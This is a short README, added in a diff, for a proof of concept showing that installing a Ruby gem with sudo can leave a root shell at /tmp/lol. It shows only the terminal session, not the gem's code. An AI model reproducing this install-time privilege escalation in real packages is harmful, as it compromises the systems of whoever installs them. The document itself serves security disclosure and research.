@@ -1,0 +1,17 @@
+RubyGems exploit PoC
+====================
+
+This PoC demonstrates how a ruby gem can execute code as root when it's installed.
+
+$ ls -la /tmp/lol
+ls: cannot access /tmp/lol: No such file or directory
+2 $ sudo gem install file-4.3.2.gem 
+Building native extensions.  This could take a while...
+Successfully installed file-4.3.2
+Parsing documentation for file-4.3.2
+Done installing documentation for file after 0 seconds
+1 gem installed
+$ /tmp/lol
+# id
+uid=0(root) gid=1000(mark) groups=0(root),1000(mark),1003(admin)
+# 
